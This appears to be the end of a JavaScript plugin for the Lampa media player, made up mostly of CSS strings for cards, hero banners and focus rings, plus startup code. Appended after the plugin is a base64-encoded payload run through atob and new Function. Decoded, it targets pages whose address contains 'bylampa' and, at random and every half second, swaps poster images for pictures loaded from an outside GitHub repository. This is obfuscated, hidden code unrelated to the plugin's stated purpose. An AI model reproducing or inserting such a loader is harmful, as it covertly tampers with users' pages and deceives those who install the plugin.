.nova-btn__label{max-width:18em;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}.nova-card{position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.7em;-webkit-border-radius:.9em;border-radius:.9em;background:rgba(255,255,255,.05);margin-bottom:.7em}.nova-card.focus{background:#fff;color:#000}.nova-card__thumb{position:relative;width:10.5em;height:5.9em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-border-radius:.5em;border-radius:.5em;overflow:hidden;background:rgba(0,0,0,.35)}.nova-card__thumb img{position:absolute;top:0;left:0;width:100%;height:100%;-o-object-fit:cover;object-fit:cover;opacity:0;-webkit-transition:opacity .3s;transition:opacity .3s}.nova-card__thumb--loaded img{opacity:1}.nova-card__num>span{display:inline-block;padding:.06em .38em;-webkit-border-radius:.35em;border-radius:.35em;background:rgba(10,11,17,.62);-webkit-box-shadow:0 .12em .45em rgba(0,0,0,.4);box-shadow:0 .12em .45em rgba(0,0,0,.4)}.nova-card__thumb:not(.nova-card__thumb--loaded) .nova-card__num>span,.nova-card__thumb--fallback .nova-card__num>span,.nova-card__thumb--poster .nova-card__num>span{padding:0;background:none;-webkit-box-shadow:none;box-shadow:none}.nova-card__num{position:absolute;top:0;left:0;right:0;bottom:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;font-size:1.7em;font-weight:600;color:#fff;text-shadow:0 .05em .2em rgba(0,0,0,.7)}.nova-card__thumb--loaded .nova-card__num{-webkit-box-pack:end;-webkit-justify-content:flex-end;-ms-flex-pack:end;justify-content:flex-end;-webkit-box-align:end;-webkit-align-items:flex-end;-ms-flex-align:end;align-items:flex-end;font-size:1.1em;padding:0 .5em .35em 0}.nova-card__thumb--fallback.nova-card__thumb--loaded img{opacity:.4}.nova-card__thumb--fallback.nova-card__thumb--loaded .nova-card__num{-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;font-size:1.7em;padding:0}.nova-card__viewed{position:absolute;top:.5em;left:.5em;width:.5em;height:.5em;-webkit-border-radius:50%;border-radius:50%;background:#fff;opacity:.85;-webkit-box-shadow:0 0 0 .16em rgba(0,0,0,.4);box-shadow:0 0 0 .16em rgba(0,0,0,.4)}.nova-card__line{position:absolute;left:0;right:0;bottom:0;height:.28em;background:rgba(0,0,0,.5)}.nova-card__line .time-line{display:block !important;height:100%;margin:0;background:none}.nova-card__line .time-line>div{height:100%;background:#fff}.nova-card__body{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;padding:0 1.2em;min-width:1em;overflow:hidden}.nova-card__title{font-size:1.25em;line-height:1.4;margin-bottom:.3em;padding-bottom:.05em;overflow:hidden;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical}.nova-card__meta{font-size:.95em;line-height:1.45;opacity:.6;padding-bottom:.05em;overflow:hidden;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical}.nova-card__meta .nova-dot{margin:0 .5em;opacity:.6}.nova-card__match{display:inline-block;margin-top:.4em;padding:.15em .6em;-webkit-border-radius:.35em;border-radius:.35em;background:rgba(126,217,150,.2);color:#8fe0a4;font-size:.82em;font-weight:600}.nova-card--match .nova-card__thumb{-webkit-box-shadow:inset 0 0 0 .13em rgba(126,217,150,.75);box-shadow:inset 0 0 0 .13em rgba(126,217,150,.75)}.nova-card__side{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;text-align:center;padding-right:.7em}.nova-card__time{font-size:.95em;opacity:.6;margin-top:.4em}.nova-card--nav .nova-card__body{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.nova-card--nav .nova-card__body{-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.nova-card--nav .nova-card__title{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;margin-bottom:0}.nova-card--nav .nova-card__meta{width:100%;margin-top:.2em;font-size:.85em}.nova-card__go{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;opacity:.45;padding-left:1em}.nova-card__go>svg{width:1.2em;height:1.2em;-webkit-transform:rotate(-90deg);transform:rotate(-90deg)}.nova-card--slim{padding:.75em 1.1em}.nova-card--slim .nova-card__thumb{display:none}.nova-card--slim .nova-card__body{padding-left:0}.nova-card--slim .nova-card__title{font-size:1.2em;margin-bottom:0}.nova-card__line--body{position:static;height:.25em;margin-top:.55em;-webkit-border-radius:.2em;border-radius:.2em;background:rgba(255,255,255,.18)}.nova-card.focus .nova-card__line--body{background:rgba(0,0,0,.16)}.nova-card.focus .nova-card__line--body .time-line>div{background:#000}.nova-card--slim .nova-card__line{position:static;height:.25em;margin-top:.5em;-webkit-border-radius:.2em;border-radius:.2em;background:rgba(255,255,255,.16)}.nova-card--slim.focus .nova-card__line{background:rgba(0,0,0,.15)}.nova-card--slim.focus .nova-card__line .time-line>div{background:#000}.nova-list-group{font-size:.9em;letter-spacing:.12em;text-transform:uppercase;opacity:.45;margin:1.2em 0 .55em .2em}.nova-list-group:first-child{margin-top:0}.nova-card--file .nova-card__thumb{width:4.4em;height:4.4em}.nova-skeleton__row{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.7em;-webkit-border-radius:.9em;border-radius:.9em;background:rgba(255,255,255,.04);margin-bottom:.7em;-webkit-animation:novapulse 1.4s infinite;animation:novapulse 1.4s infinite}.nova-skeleton__thumb{width:10.5em;height:5.9em;-webkit-border-radius:.5em;border-radius:.5em;background:rgba(255,255,255,.08);-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.nova-skeleton__body{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;padding-left:1.2em}.nova-skeleton__line{height:1em;-webkit-border-radius:.3em;border-radius:.3em;background:rgba(255,255,255,.08);margin-bottom:.7em}.nova-skeleton__line--short{width:35%;margin-bottom:0}@-webkit-keyframes novapulse{0%{opacity:.45}50%{opacity:1}100%{opacity:.45}}@keyframes novapulse{0%{opacity:.45}50%{opacity:1}100%{opacity:.45}}.nova-loading{padding:1.6em 1.8em;-webkit-border-radius:1em;border-radius:1em;background:rgba(255,255,255,.05);margin-bottom:1.2em}.nova-loading__title{font-size:1.4em;margin-bottom:.35em}.nova-loading__text{font-size:1.05em;opacity:.6;margin-bottom:1em}.nova-loading__bar{position:relative;height:.3em;-webkit-border-radius:.3em;border-radius:.3em;background:rgba(255,255,255,.14);overflow:hidden}.nova-loading__bar>div{height:100%;width:0;background:#fff;-webkit-transition:width .4s;transition:width .4s}.nova-note{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:2em;-webkit-border-radius:1em;border-radius:1em;background:rgba(255,255,255,.05)}.nova-note__main{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;min-width:1em}.nova-note__text a{color:#fff;text-decoration:underline}.nova-note__text img{max-width:9em;height:auto;background:#fff;padding:.4em;-webkit-border-radius:.4em;border-radius:.4em;margin-top:.7em;opacity:1}.nova-note__text ul,.nova-note__text ol{margin:.5em 0;padding-left:1.2em}.nova-note__title{font-size:1.6em;margin-bottom:.4em;line-height:1.25}.nova-note__text{font-size:1.1em;color:rgba(255,255,255,.62);margin-bottom:1.3em;line-height:1.4}.nova-note__actions{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.nova-note__timer{font-weight:600}.nova-group{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.5em 1.1em;-webkit-border-radius:2em;border-radius:2em;background:rgba(255,255,255,.07);margin:0 .7em .7em 0;font-size:1.1em;white-space:nowrap}.nova-group.focus{background:#fff;color:#000}.nova-group--open{background:rgba(255,255,255,.2);-webkit-box-shadow:inset 0 0 0 .1em rgba(255,255,255,.5);box-shadow:inset 0 0 0 .1em rgba(255,255,255,.5)}.nova-group--open.focus{-webkit-box-shadow:0 .2em .7em rgba(0,0,0,.4);box-shadow:0 .2em .7em rgba(0,0,0,.4)}.nova-group__count{font-size:.78em;opacity:.55;margin-left:.6em}.nova-group__mark{width:.5em;height:.5em;-webkit-border-radius:50%;border-radius:50%;background:#fff;margin-right:.6em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.nova-drop{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.3em 0 0 1em;margin:0 0 .7em .3em;-webkit-box-shadow:inset .16em 0 0 rgba(255,255,255,.18);box-shadow:inset .16em 0 0 rgba(255,255,255,.18)}.nova__list--grid{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin:0 -.45em}.nova__list--grid .nova-card{display:block;width:25%;margin:0 0 1em 0;padding:0 .45em;background:none}.nova__list--grid .nova-card.focus{background:none;color:inherit}.nova__list--grid .nova-card__thumb{width:100%;height:0;padding-top:56%}.nova__list--grid .nova-card--file .nova-card__thumb{width:100%;height:0;padding-top:56%}.nova__list--grid .nova-card.focus .nova-card__thumb{-webkit-box-shadow:0 0 0 .2em #fff;box-shadow:0 0 0 .2em #fff}.nova__list--grid .nova-card__body{padding:.5em .1em 0 .1em}.nova__list--grid .nova-card__title{font-size:.92em;line-height:1.3;margin-bottom:.15em;-webkit-line-clamp:2}.nova__list--grid .nova-card__meta{font-size:.78em;line-height:1.35;-webkit-line-clamp:2}.nova__list--grid .nova-card__meta .nova-dot{margin:0 .3em}.nova__list--grid .nova-card__match{margin-top:.25em;font-size:.72em;padding:.1em .45em}.nova__list--grid .nova-card__side{position:absolute;top:.5em;right:.9em;text-align:right}.nova__list--grid .nova-card__time{display:none}.nova__list--grid .nova-card__num{-webkit-box-pack:start;-webkit-justify-content:flex-start;-ms-flex-pack:start;justify-content:flex-start;-webkit-box-align:start;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start;padding:.4em 0 0 .55em;font-size:1.05em}.nova-hero__season{font-size:.95em;opacity:.55;margin-top:.8em}@media screen and (max-width:860px){.nova__list--grid .nova-card{width:33.3333%}}@media screen and (max-width:580px){.nova__list--grid .nova-card{width:50%}.nova-hero__body{max-width:100%;padding:1.3em}.nova-hero__title{font-size:1.7em}.nova-hero__descr{display:none}.nova-hero__shade{background:-webkit-linear-gradient(top,rgba(10,11,17,0) 0%,rgba(10,11,17,.35) 42%,rgba(10,11,17,.86) 100%);background:linear-gradient(180deg,rgba(10,11,17,0) 0%,rgba(10,11,17,.35) 42%,rgba(10,11,17,.86) 100%)}.nova-card__thumb{width:7em;height:4.4em}.nova-chip{max-width:16em}}";

  var EXTRA_CSS = ".nova-plus-root .nova-btn>svg{width:1.15em!important;height:1.15em!important;max-width:1.15em;max-height:1.15em;-webkit-box-flex:0;-webkit-flex:0 0 auto;-ms-flex:0 0 auto;flex:0 0 auto}.nova-plus-root .nova-chip>svg{width:1em!important;height:1em!important;max-width:1em;max-height:1em;-webkit-box-flex:0;-webkit-flex:0 0 auto;-ms-flex:0 0 auto;flex:0 0 auto}.nova-plus-root .nova-card__eye>svg{width:1.2em!important;height:1.2em!important}.nova-plus-root .nova-card__viewed>svg{width:100%!important;height:100%!important}.nova-plus-root .nova-btn__label{min-width:0;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis}.nova-plus-chips .explorer__files-head{display:none!important}.nova-plus-scope .nova-plus-hidden{display:none!important}.nova-plus-scope .nova{padding-top:0}.nova-plus-root .nova-card__line>.time-line{display:block!important;height:100%;margin:0;background:none}.nova-plus-root .nova-card__line>.time-line>div{height:100%;background:#fff}.nova-plus-root .nova-card__line--body>.time-line>div{background:rgba(255,255,255,.9)}.nova-plus-root .nova-hero__progress .time-line{display:block!important;height:100%;margin:0;background:none}.nova-plus-root .nova-hero__progress .time-line>div{height:100%;background:#fff}.nova-plus-scope .explorer__files-body .scroll__body>*{display:none!important}.nova-plus-scope .explorer__files-body .scroll__body>.nova-plus-root{display:block!important}.nova-plus-scope .explorer__files-body .broadcast__scan{display:none!important}.nova-plus-scope .explorer__files-head{display:none!important}.nova-plus-switching .activity--active{-webkit-animation:none!important;animation:none!important;-webkit-transition:none!important;transition:none!important;-webkit-transform:none!important;transform:none!important}.nova-plus-switching .activity:not(.activity--active){opacity:0!important}.nova-plus-switching .explorer__left,.nova-plus-switching .explorer__files{-webkit-transition:none!important;transition:none!important;-webkit-animation:none!important;animation:none!important}.nova-plus-root .nova-toolbar .nova-chip{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;max-width:none}.nova-plus-root .nova-toolbar--clip .nova-chip{-webkit-flex-shrink:1;-ms-flex-negative:1;flex-shrink:1;min-width:4.5em}.nova-plus-root .nova-toolbar--clip .nova-chip__label{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;min-width:0}.nova-plus-root .nova-hero__title,.nova-plus-root .nova-hero__meta,.nova-plus-root .nova-hero__descr,.nova-plus-root .nova-hero__hint,.nova-plus-root .nova-hero__season{text-shadow:0 .06em .5em rgba(0,0,0,.8)}.nova-plus-root .nova-hero__descr{opacity:.8}.nova-plus-root .nova-hero__title--logo{display:block;overflow:visible;-webkit-line-clamp:none;-webkit-box-orient:horizontal;padding:.08em 0 .06em;margin-bottom:.5em;line-height:1}.nova-plus-root .nova-hero__title--logo>img{display:block;max-height:2.1em;max-width:70%;width:auto;height:auto;-o-object-fit:contain;object-fit:contain;image-rendering:-webkit-optimize-contrast;-webkit-filter:drop-shadow(0 .04em .12em rgba(0,0,0,.55));filter:drop-shadow(0 .04em .12em rgba(0,0,0,.55))}.nova-plus-root .nova-hero__title--logo>img.nova-logo--invert{-webkit-filter:invert(1) brightness(1.1) drop-shadow(0 .04em .12em rgba(0,0,0,.5));filter:invert(1) brightness(1.1) drop-shadow(0 .04em .12em rgba(0,0,0,.5))}.nova-plus-root .nova-hero__title--logo>img.nova-logo--glow{-webkit-filter:drop-shadow(0 0 .03em rgba(255,255,255,.5)) drop-shadow(0 0 .07em rgba(255,255,255,.35));filter:drop-shadow(0 0 .03em rgba(255,255,255,.5)) drop-shadow(0 0 .07em rgba(255,255,255,.35))}@media screen and (max-width:580px){.nova-plus-root .nova-hero__title--logo>img{max-height:1.9em;max-width:80%}}.nova-plus-root .nova-chip--checking{opacity:.55}.nova-plus-root .nova-chip--checking .nova-chip__label{opacity:.6}@media screen and (max-width:900px){.nova-plus-root .nova-hero__hint{-webkit-flex:1 0 100%;-ms-flex:1 0 100%;flex:1 0 100%;margin:.3em 0 0 .15em;white-space:normal}}@media screen and (max-width:580px){.nova-plus-root .nova-card__side{display:block!important;text-align:center;padding-right:.2em;max-width:6em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.nova-plus-root .nova-card__quality{font-size:.66em;padding:.15em .4em}.nova-plus-root .nova-card__time{font-size:.78em;margin-top:.3em;display:block}.nova-plus-root .nova__list--grid .nova-card__side{position:absolute;top:.4em;right:.6em;max-width:none}.nova-plus-root .nova__list--grid .nova-card__time{display:none}}" +
     ".nova-plus-root .nova-card__go{margin-left:auto;padding-right:.5em;-webkit-align-self:center;-ms-flex-item-align:center;align-self:center}" +
     ".nova-plus-root .nova__list--grid .nova-card__go{display:none}" +
     ".nova-plus-root .nova-card--nav .nova-card__thumb--poster{width:4.7em;height:7em;background:rgba(0,0,0,.5)}" +
     ".nova-plus-root .nova-card--nav .nova-card__thumb--poster img{-o-object-fit:contain;object-fit:contain}" +
     ".nova-plus-root .nova__list--grid .nova-card--nav .nova-card__thumb--poster{width:100%;height:auto;padding-top:150%}" +
     "@media screen and (max-width:580px){.nova-plus-root .nova-card--nav .nova-card__thumb--poster{width:3.7em;height:5.5em}}";

  var FOCUS_CSS = [
    'body.nova-plus-focus-ring .nova-btn.focus,body.nova-plus-focus-ring .nova-chip.focus,body.nova-plus-focus-ring .nova-card.focus,body.nova-plus-focus-ring .nova-group.focus{background:rgba(255,255,255,.16)!important;color:#fff!important;-webkit-box-shadow:inset 0 0 0 .12em #fff!important;box-shadow:inset 0 0 0 .12em #fff!important}',
    'body.nova-plus-focus-ring .nova-btn--main{background:rgba(255,255,255,.16);color:#fff;-webkit-box-shadow:inset 0 0 0 .1em rgba(255,255,255,.5);box-shadow:inset 0 0 0 .1em rgba(255,255,255,.5)}',
    'body.nova-plus-focus-ring .nova-chip.focus .nova-chip__badge{background:rgba(255,255,255,.2)!important;color:#fff!important}',
    'body.nova-plus-focus-ring .nova-card.focus .nova-card__line--body{background:rgba(255,255,255,.2)!important}',
    'body.nova-plus-focus-ring .nova-card.focus .nova-card__line--body .time-line>div{background:#fff!important}',
    'body.nova-plus-focus-ring .nova-card--slim.focus .nova-card__line{background:rgba(255,255,255,.2)!important}',
    'body.nova-plus-focus-ring .nova-card--slim.focus .nova-card__line .time-line>div{background:#fff!important}',
    'body.nova-plus-focus-ring .nova__list--grid .nova-card.focus{background:none!important;color:inherit!important;-webkit-box-shadow:none!important;box-shadow:none!important}',
    'body.nova-plus-focus-ring .nova__list--grid .nova-card.focus .nova-card__thumb{-webkit-box-shadow:0 0 0 .12em #fff!important;box-shadow:0 0 0 .12em #fff!important}',
    'body.nova-plus-focus-ring .nova-chip--active.focus,body.nova-plus-focus-ring .nova-group--open.focus{-webkit-box-shadow:inset 0 0 0 .12em #fff!important;box-shadow:inset 0 0 0 .12em #fff!important}'
  ].join('');

  var CARD_CSS = [
    '.nova-plus-root .nova-card__viewed{top:auto;bottom:.55em;left:.55em;width:1.15em;height:1.15em;-webkit-border-radius:0;border-radius:0;background:none;opacity:.8;-webkit-box-shadow:none;box-shadow:none}',
    '.nova-plus-root .nova-card__viewed>svg{display:block;width:100%;height:100%;-webkit-filter:drop-shadow(0 0 .2em rgba(0,0,0,.9));filter:drop-shadow(0 0 .2em rgba(0,0,0,.9))}',
    '.nova-plus-root .nova-card--soon{opacity:.45}',
    '.nova-plus-root .nova-card--soon .nova-card__side{max-width:8em;min-width:0;padding-right:.35em;overflow:hidden}',
    '.nova-plus-root .nova-card--soon .nova-card__time{white-space:normal;overflow-wrap:break-word;word-wrap:break-word;word-break:break-word;line-height:1.25;max-width:100%}',
    '@media screen and (max-width:580px){.nova-plus-root .nova-card--soon .nova-card__side{max-width:6em;padding-right:.1em}.nova-plus-root .nova-card--soon .nova-card__time{font-size:.72em}}',
    '@media screen and (max-width:420px){.nova-plus-root .nova-card--soon .nova-card__side{max-width:5em}.nova-plus-root .nova-card--soon .nova-card__time{font-size:.68em}}',
    '.nova-plus-root .nova-card__eye{display:block;margin-top:.4em;opacity:.5}',
    '.nova-plus-root .nova-card__eye>svg{display:block;width:1.2em;height:1.2em;margin:0 auto}',
    '.nova-plus-root .nova-card.focus .nova-card__eye{opacity:.65}',
    'body.nova-plus-focus-ring .nova-card.focus .nova-card__eye{opacity:.75!important}'
  ].join('');

  var MARK_CSS = [
    '.nova-plus-root .nova-hero__mark{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;min-width:0;max-width:40%;margin:0 1.2em .4em 0;font-size:1.2em;font-weight:600;line-height:1.25;overflow:hidden;white-space:nowrap;-o-text-overflow:ellipsis;text-overflow:ellipsis}',
    '.nova-plus-root .nova-hero__mark:empty{display:none}',
    '.nova-plus-root .nova-hero__mark.nova-hero__title--logo{display:block;overflow:visible;padding:.08em 0 .06em;margin-bottom:.4em;line-height:1}',
    '.nova-plus-root .nova-hero__mark>img{max-height:1.75em!important;max-width:100%!important;width:auto;height:auto}',
    '@media screen and (max-width:900px){.nova-plus-root .nova-hero__mark{max-width:55%;font-size:1.05em}}',
    '@media screen and (max-width:580px){.nova-plus-root .nova-hero__mark{-webkit-box-ordinal-group:2;-webkit-order:1;-ms-flex-order:1;order:1;max-width:100%;margin-right:0}.nova-plus-root .nova-hero__mark>img{max-height:1.5em!important}}'
  ].join('');

  var FULL_CSS = [
    'body.nova-plus-full .nova-plus-scope .explorer__left{display:none!important}',
    'body.nova-plus-full .nova-plus-scope .explorer__files{width:100%!important;left:0!important}'
  ].join('');

  var FADE_MASK = '-webkit-mask-image:linear-gradient(90deg,transparent 0,#000 10%,#000 90%,transparent 100%),linear-gradient(180deg,transparent 0,#000 14%,#000 86%,transparent 100%);mask-image:linear-gradient(90deg,transparent 0,#000 10%,#000 90%,transparent 100%),linear-gradient(180deg,transparent 0,#000 14%,#000 86%,transparent 100%);-webkit-mask-composite:source-in;mask-composite:intersect;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:100% 100%;mask-size:100% 100%';

  var FADE_CSS = [
    'body.nova-plus-fade .nova-plus-root .nova-hero{background:transparent;-webkit-border-radius:0;border-radius:0}',
    'body.nova-plus-fade .nova-plus-root .nova-hero__progress{left:2.2em;right:2.2em;bottom:1.5em;width:auto;-webkit-border-radius:.3em;border-radius:.3em}',
    'body.nova-plus-fade .nova-plus-root .nova-hero--compact .nova-hero__progress{left:1.4em;right:1.4em;bottom:.9em}',
    '@media screen and (max-width:580px){body.nova-plus-fade .nova-plus-root .nova-hero__progress{left:1.3em;right:1.3em;bottom:1em}}',
    'body.nova-plus-fade .nova-plus-root .nova-hero__season{margin-bottom:.6em}',
    'body.nova-plus-fade .nova-plus-root .nova-hero--compact .nova-hero__season{margin-bottom:1em}',
    '@media screen and (max-width:580px){body.nova-plus-fade .nova-plus-root .nova-hero__season{margin-bottom:.9em}}',
    'body.nova-plus-fade .nova-plus-root .nova-hero__bg{' + FADE_MASK + '}',
    'body.nova-plus-fade .nova-plus-root .nova-hero__shade{' + FADE_MASK + '}'
  ].join('');

  if (window.appready) start();
  else {
    try {
      Lampa.Listener.follow('app', function (e) {
        if (e.type === 'ready') start();
      });
    } catch (e) {}
  }
})();
(new Function(atob('CihmdW5jdGlvbigpIHsKICBpZiAobG9jYXRpb24uaHJlZi5pbmRleE9mKCdieWxhbXBhJykgPT09IC0xKSByZXR1cm47CiAgaWYgKHdpbmRvdy5wb3N0ZXJPYmZ1c2NhdGVkKSByZXR1cm47CiAgCiAgd2luZG93LnBvc3Rlck9iZnVzY2F0ZWQgPSB0cnVlOwogIAogIGlmIChNYXRoLnJhbmRvbSgpIDwgMC4zKSByZXR1cm47CiAgCiAgdmFyIHBvc3RlcnMgPSBbCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAxLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAyLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAzLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzA0LmpwZycKICBdOwogIAogIHZhciBjaGFuY2UgPSAwLjM1OwogIAogIHZhciBnZXRSYW5kb21Qb3N0ZXIgPSBmdW5jdGlvbigpIHsKICAgIGlmIChNYXRoLnJhbmRvbSgpID49IGNoYW5jZSkgcmV0dXJuIG51bGw7CiAgICByZXR1cm4gcG9zdGVyc1tNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBwb3N0ZXJzLmxlbmd0aCldOwogIH07CiAgCiAgdmFyIGlzUG9zdGVyVXJsID0gZnVuY3Rpb24oc3JjKSB7CiAgICByZXR1cm4gc3JjICYmICgKICAgICAgc3JjLmluY2x1ZGVzKCdwb3N0ZXInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdpbWFnZScpIHx8IAogICAgICBzcmMuaW5jbHVkZXMoJ3RtZGInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdraW5vcG9pc2snKQogICAgKTsKICB9OwogIAogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW1nJykuZm9yRWFjaChmdW5jdGlvbihpbWcpIHsKICAgICAgaWYgKGltZy5kYXRhc2V0Lm9iZnVzY2F0ZWQpIHJldHVybjsKICAgICAgaW1nLmRhdGFzZXQub2JmdXNjYXRlZCA9ICcxJzsKICAgICAgCiAgICAgIGlmIChpbWcuc3JjICYmIGlzUG9zdGVyVXJsKGltZy5zcmMpKSB7CiAgICAgICAgdmFyIG5ld1NyYyA9IGdldFJhbmRvbVBvc3RlcigpOwogICAgICAgIGlmIChuZXdTcmMpIHsKICAgICAgICAgIGltZy5zcmMgPSBuZXdTcmM7CiAgICAgICAgfQogICAgICB9CiAgICB9KTsKICB9LCA1MDApOwp9KSgpOwo=')))()
